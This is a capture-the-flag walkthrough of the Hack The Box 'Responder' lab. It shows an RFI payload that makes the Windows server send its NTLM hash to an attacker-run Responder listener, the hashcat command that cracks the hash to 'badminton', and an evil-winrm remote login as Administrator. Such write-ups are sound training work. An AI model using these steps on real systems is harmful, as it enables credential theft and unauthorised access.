---
title: "HTB: Responder - Write-Up"
description: "A walkthrough for the HTB machine Responder, focusing on gaining root access and retrieving the flag."
date: 2024-07-29
categories: [CTF, HackTheBox]
tags: [privilege escalation, LFI, RFI, NTLM, Responder]
image:
  path: thbnls/responder.png
---

**TARGET MACHINE IP ADDRESS**

``10.129.240.15``

### TASK 1

When visiting the web service using the IP address, what is the domain that we are being redirected to?

<details> 
<summary>Task 1 Hint</summary> 
Use the browser to visit the IP address of the box and watch how it changes.
</details>

![Pasted image 20240725102844](https://github.com/user-attachments/assets/0ca71313-fdf5-4b84-abb3-d1bd155b64e0)

```bash
┌──(root㉿neo)-[~]
└─# nano /etc/hosts

┌──(root㉿neo)-[~]
└─# cat /etc/hosts                           
127.0.0.1	localhost
127.0.1.1	kali
10.129.240.15   unika.htb
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

![Pasted image 20240725103202](https://github.com/user-attachments/assets/332134d6-4e51-4a61-b818-87c4bba37396)

**Ans:**
```
unika.htb
```

---

#### TASK 2

Which scripting language is being used on the server to generate webpages?

<details> <summary>Task 2 Hint</summary> Observe the URL in the browser to spot the extension of the page which is being loaded. </details>

**Ans :**
```
php
```

---

#### TASK 3

What is the name of the URL parameter which is used to load different language versions of the webpage?

<details> <summary>Task 3 Hint</summary> Analyze the URL on visiting the different language versions of the page.

</details>

![Pasted image 20240725103637](https://github.com/user-attachments/assets/05eebb6f-05b1-4717-ad04-d39b9b854a70)

**Ans :**
```
page
```

---

#### TASK 4

Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"

<details> <summary>Task 4 Hint</summary> An LFI is accessing a file on the local system that isn't intended to be read.

</details>

![Pasted image 20240725103817](https://github.com/user-attachments/assets/cd2c433c-8f39-41f0-a19a-05238805991b)

**Ans :**
```
../../../../../../../../windows/system32/drivers/etc/hosts
```

---

#### TASK 5

Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"

<details> <summary>Task 5 Hint</summary> An RFI tricks the server into including file from another server such as the attacker's server. </details>

**Ans :**
```
//10.10.14.6/somefile
```

---

#### TASK 6

What does NTLM stand for?

<details> <summary>Task 6 Hint</summary> Use Google. </details>

**Ans :**
```
New Technology LAN Manager
```

---

#### TASK 7

Which flag do we use in the Responder utility to specify the network interface?

<details> <summary>Task 7 Hint</summary> Use `--help` flag to see the usage of all the flags. </details>


**Ans :**
```
-I
```

---

#### TASK 8

There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.

<details> <summary>Task 8 Hint</summary> Try Googling "john" with some other key words like "hash" and "crack". </details>

**Ans :**
```
John The Ripper
```

---

#### TASK 9

What is the password for the administrator user?

<details> <summary>Task 9 Hint</summary> Use `john` to crack the password hash captured by Responder.</details>

**Lets Capture :**

Responder Set to tun0 (hackthebox vpn ip)

```bash
┌──(root㉿neo)-[~]
└─# responder -I tun0         
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.4.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.15.210]
    Responder IPv6             [dead:beef:2::11d0]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']

[+] Current Session Variables:
    Responder Machine Name     [WIN-10L6AKQRX9H]
    Responder Domain Name      [PRHM.LOCAL]
    Responder DCE-RPC Port     [47184]

[+] Listening for events...
```

**Go to webbrowser :**

**Use Payload :**

```
http://unika.htb/index.php?page=//10.10.15.210/somefile
```

![Pasted image 20240725105901](https://github.com/user-attachments/assets/95b024f4-6df0-4497-bcad-ed7a30808df5)

**Responder :**

```ntlm
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.240.15
[SMB] NTLMv2-SSP Username : RESPONDER\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:2af81eba2c2cb738:E3B9B90BCB93102EBD18D9CC6A92EA7D:010100000000000080C9F4BD7FDEDA01EC7F17ED8C3E022E00000000020008005000520048004D0001001E00570049004E002D00310030004C00360041004B005100520058003900480004003400570049004E002D00310030004C00360041004B00510052005800390048002E005000520048004D002E004C004F00430041004C00030014005000520048004D002E004C004F00430041004C00050014005000520048004D002E004C004F00430041004C000700080080C9F4BD7FDEDA0106000400020000000800300030000000000000000100000000200000BEB192F59CF38F42A8B1FFDCBB5B3E1F373D75A45186A46CA7DC6563D948B7660A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003200310030000000000000000000
```

**Crack The Hash :**

Save the Hash as `hash.txt`

```NTLM
┌──(root㉿neo)-[~]
└─# echo 'Administrator::RESPONDER:2af81eba2c2cb738:E3B9B90BCB93102EBD18D9CC6A92EA7D:010100000000000080C9F4BD7FDEDA01EC7F17ED8C3E022E00000000020008005000520048004D0001001E00570049004E002D00310030004C00360041004B005100520058003900480004003400570049004E002D00310030004C00360041004B00510052005800390048002E005000520048004D002E004C004F00430041004C00030014005000520048004D002E004C004F00430041004C00050014005000520048004D002E004C004F00430041004C000700080080C9F4BD7FDEDA0106000400020000000800300030000000000000000100000000200000BEB192F59CF38F42A8B1FFDCBB5B3E1F373D75A45186A46CA7DC6563D948B7660A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003200310030000000000000000000' > hash.txt
```

*Here i am using hashcat because its powerful and faster than john* 


```bash
┌──(root㉿neo)-[~]
└─# hashcat -m 5600 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i3-1125G4 @ 2.00GHz, 2740/5544 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

ADMINISTRATOR::RESPONDER:2af81eba2c2cb738:e3b9b90bcb93102ebd18d9cc6a92ea7d:010100000000000080c9f4bd7fdeda01ec7f17ed8c3e022e00000000020008005000520048004d0001001e00570049004e002d00310030004c00360041004b005100520058003900480004003400570049004e002d00310030004c00360041004b00510052005800390048002e005000520048004d002e004c004f00430041004c00030014005000520048004d002e004c004f00430041004c00050014005000520048004d002e004c004f00430041004c000700080080c9f4bd7fdeda0106000400020000000800300030000000000000000100000000200000beb192f59cf38f42a8b1ffdcbb5b3e1f373d75a45186a46ca7dc6563d948b7660a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310035002e003200310030000000000000000000:badminton
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: ADMINISTRATOR::RESPONDER:2af81eba2c2cb738:e3b9b90bc...000000
Time.Started.....: Thu Jul 25 11:02:10 2024 (0 secs)
Time.Estimated...: Thu Jul 25 11:02:10 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    50130 H/s (7.72ms) @ Accel:512 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4096/14344385 (0.03%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> oooooo
Hardware.Mon.#1..: Temp: 79c Util: 99%

Started: Thu Jul 25 11:01:36 2024
Stopped: Thu Jul 25 11:02:12 2024
                                                                                                                                                                                                                                             
┌──(root㉿neo)-[~]
└─# 
```


**Password** : `badminton`

**Ans :**
```
badminton
```

---

#### TASK 10

We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?

<details> <summary>Task 10 Hint</summary> Consider the user who logged in with the captured hash and which directories they might be able to access. </details>

```bash
┌──(root㉿neo)-[~]
└─# nmap -sV 10.129.158.165      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-25 11:06 IST
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.20 seconds
                                                                                                                                                                                                                                             
┌──(root㉿neo)-[~]
└─# nmap -sV 10.129.240.15  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-25 11:06 IST
Nmap scan report for unika.htb (10.129.240.15)
Host is up (0.29s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.57 seconds
                                                                        
```

**Ans :**
```
5985
```

---
### SUBMIT FLAG

**Submit root flag**

```
evil-winrm -i 10.129.112.164 -u Administrator -p badminton
```

﻿**Flag :**
```
ea81b7afddd03efaa0945333ed147fac
```
